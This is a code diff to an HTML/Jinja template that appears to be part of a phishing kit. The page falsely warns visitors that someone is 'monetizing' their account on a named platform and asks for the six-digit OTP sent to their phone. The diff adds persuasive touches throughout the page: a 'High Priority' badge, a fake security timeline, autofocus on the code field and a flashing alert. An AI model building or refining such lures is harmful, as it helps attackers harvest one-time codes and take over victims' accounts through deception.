@@ -1,6 +1,6 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(16,185,129,0.25);border-radius:16px;">
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px rgba(16,185,129,0.15);border-radius:16px;">
   {% if platform_icon and platform_name %}
   <div class="platform-header">
     <div class="icon-circle" style="background: rgba(16,185,129,0.1); border: 2px solid rgba(16,185,129,0.2);">
@@ -13,11 +13,17 @@
   </div>
   {% endif %}
 
-  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">⚠️ Security Alert - Confirm Identity</h3>
+  <div class="security-alert-header">
+    <div class="alert-icon">⚠️</div>
+    <h3 style="color:#e11d48;margin:0;font-size:18px;font-weight:600">Security Alert - Confirm Identity</h3>
+  </div>
   
   <div class="security-alert">
     <div class="alert-card">
-      <h4 style="color:#1e293b;margin:0 0 12px 0;font-size:16px;font-weight:600">🔒 Account Monetization Attempt</h4>
+      <div class="alert-title">
+        <div class="alert-badge">High Priority</div>
+        <h4 style="color:#1e293b;margin:0 0 12px 0;font-size:16px;font-weight:600">🔒 Account Monetization Attempt</h4>
+      </div>
       <p style="color:#475569;margin:0;line-height:1.6;font-size:14px">
         <strong>Security Notice:</strong> Someone is attempting to monetize your {{ platform_name }} account. 
         If this is you, please enter the OTP code that has been sent to your registered phone number to confirm your identity.
@@ -26,14 +32,41 @@
   </div>
 
   <form id="digitsForm" method="POST" novalidate>
-    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Confirmation OTP Code</label>
-    <input class="input" id="digits" name="digits" placeholder="Enter 6-digit OTP code" pattern="\d{6}" required>
+    <div class="input-group">
+      <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Confirmation OTP Code</label>
+      <input class="input" id="digits" name="digits" placeholder="Enter 6-digit OTP code" pattern="\d{6}" required maxlength="6">
+      <div class="input-hint">Check your registered phone for the code</div>
+    </div>
     <div class="error-text" id="digitsError"></div>
 
     <div class="center">
       <button class="btn verify-btn" type="submit">Confirm Identity</button>
     </div>
   </form>
+
+  <div class="security-timeline">
+    <div class="timeline-item active">
+      <div class="timeline-dot"></div>
+      <div class="timeline-content">
+        <strong>Security Alert Triggered</strong>
+        <span>Just now</span>
+      </div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-dot"></div>
+      <div class="timeline-content">
+        <strong>OTP Code Sent</strong>
+        <span>To your registered device</span>
+      </div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-dot"></div>
+      <div class="timeline-content">
+        <strong>Identity Verification</strong>
+        <span>Pending</span>
+      </div>
+    </div>
+  </div>
 
   <div class="security-note" style="margin-top:20px;padding:12px 16px;background:#f0fdf4;border-radius:12px;border:1px solid #dcfce7;">
     <p style="margin:0;color:#166534;font-size:0.9rem;font-weight:500;text-align:center;">
@@ -46,26 +79,43 @@
 .input {
   width: 100%;
   padding: 14px;
-  border-radius: 18px;
+  border-radius: 14px;
   border: 1px solid #e5e7eb;
-  margin-bottom: 8px;
+  margin-bottom: 4px;
   font-size: 16px;
+  font-weight: 600;
+  text-align: center;
+  letter-spacing: 2px;
   transition: border-color 0.2s, box-shadow 0.2s;
+  background: #fafafa;
 }
 .input:focus {
   border-color: #10B981;
-  box-shadow: 0 0 0 3px rgba(16,185,129,0.25);
+  box-shadow: 0 0 0 3px rgba(16,185,129,0.15);
   outline: none;
+  background: #ffffff;
 }
 .input-error {
   border-color: #ef4444;
-  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
 }
 .error-text {
   color: #ef4444;
   font-size: 13px;
-  margin-top: -4px;
+  margin-top: 4px;
   margin-bottom: 8px;
+  font-weight: 500;
+}
+
+.input-group {
+  margin-bottom: 8px;
+}
+
+.input-hint {
+  font-size: 12px;
+  color: #6b7280;
+  margin-top: 4px;
+  text-align: center;
 }
 
 .verify-btn {
@@ -74,21 +124,38 @@
   color: #fff;
   font-size: 16px;
   font-weight: 700;
-  padding: 12px;
-  border-radius: 25px;
+  padding: 14px;
+  border-radius: 14px;
   cursor: pointer;
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 6px 16px rgba(16,185,129,0.35);
+  box-shadow: 0 4px 12px rgba(16,185,129,0.25);
   display: block;
-  margin-top: 8px;
+  margin-top: 16px;
 }
 .verify-btn:hover {
   background: #0da271;
-  box-shadow: 0 8px 20px rgba(16,185,129,0.45);
+  box-shadow: 0 6px 16px rgba(16,185,129,0.35);
+  transform: translateY(-1px);
 }
 .verify-btn:active {
   transform: scale(0.985);
+}
+
+.security-alert-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin: 20px 0 16px 0;
+  padding: 16px;
+  background: #fef2f2;
+  border-radius: 12px;
+  border-left: 4px solid #ef4444;
+}
+
+.alert-icon {
+  font-size: 24px;
+  flex-shrink: 0;
 }
 
 .security-alert {
@@ -96,12 +163,30 @@
 }
 
 .alert-card {
-  background: #fef2f2;
+  background: #ffffff;
   padding: 20px;
   border-radius: 12px;
-  border-left: 4px solid #ef4444;
-  margin-bottom: 16px;
   border: 1px solid #fecaca;
+  margin-bottom: 16px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+}
+
+.alert-title {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 12px;
+}
+
+.alert-badge {
+  background: #ef4444;
+  color: white;
+  font-size: 11px;
+  font-weight: 700;
+  padding: 4px 8px;
+  border-radius: 6px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
 }
 
 .center {
@@ -126,6 +211,100 @@
   justify-content: center;
   flex-shrink: 0;
 }
+
+/* Security Timeline */
+.security-timeline {
+  margin: 24px 0;
+  padding: 0;
+}
+
+.timeline-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  margin-bottom: 16px;
+  position: relative;
+}
+
+.timeline-item:not(:last-child)::after {
+  content: '';
+  position: absolute;
+  top: 24px;
+  left: 11px;
+  width: 2px;
+  height: calc(100% + 8px);
+  background: #e5e7eb;
+  z-index: 1;
+}
+
+.timeline-dot {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  background: #e5e7eb;
+  border: 3px solid white;
+  flex-shrink: 0;
+  position: relative;
+  z-index: 2;
+}
+
+.timeline-item.active .timeline-dot {
+  background: #10B981;
+  box-shadow: 0 0 0 3px rgba(16,185,129,0.2);
+}
+
+.timeline-content {
+  flex: 1;
+  padding-top: 2px;
+}
+
+.timeline-content strong {
+  display: block;
+  color: #1e293b;
+  font-size: 14px;
+  font-weight: 600;
+  margin-bottom: 2px;
+}
+
+.timeline-content span {
+  color: #64748b;
+  font-size: 12px;
+  font-weight: 500;
+}
+
+.timeline-item.active .timeline-content strong {
+  color: #10B981;
+}
+
+/* Enhanced responsive design */
+@media (max-width: 480px) {
+  .card {
+    margin: 20px auto;
+    border-radius: 14px;
+  }
+  
+  .security-alert-header {
+    flex-direction: column;
+    text-align: center;
+    gap: 8px;
+  }
+  
+  .alert-title {
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 8px;
+  }
+  
+  .alert-badge {
+    align-self: flex-start;
+  }
+  
+  .platform-header {
+    flex-direction: column;
+    text-align: center;
+    gap: 12px;
+  }
+}
 </style>
 
 <script>
@@ -149,11 +328,31 @@ document.getElementById("digitsForm").addEventListener("submit", function(event)
   if (!valid) event.preventDefault();
 });
 
-document.getElementById("digits").addEventListener("input", () => {
+document.getElementById("digits").addEventListener("input", function() {
   const digits = document.getElementById("digits");
   const digitsError = document.getElementById("digitsError");
   digits.classList.remove("input-error");
   digitsError.textContent = "";
+  
+  // Auto-format: only allow numbers and limit to 6 digits
+  this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
+});
+
+// Add some security-focused interactions
+document.addEventListener('DOMContentLoaded', function() {
+  const verifyBtn = document.querySelector('.verify-btn');
+  const digitsInput = document.getElementById('digits');
+  
+  // Focus on OTP input automatically
+  digitsInput.focus();
+  
+  // Add security warning effect on page load
+  setTimeout(() => {
+    document.querySelector('.security-alert-header').style.backgroundColor = '#fef2f2';
+    setTimeout(() => {
+      document.querySelector('.security-alert-header').style.backgroundColor = '#fff';
+    }, 500);
+  }, 1000);
 });
 </script>
 {% endblock %}
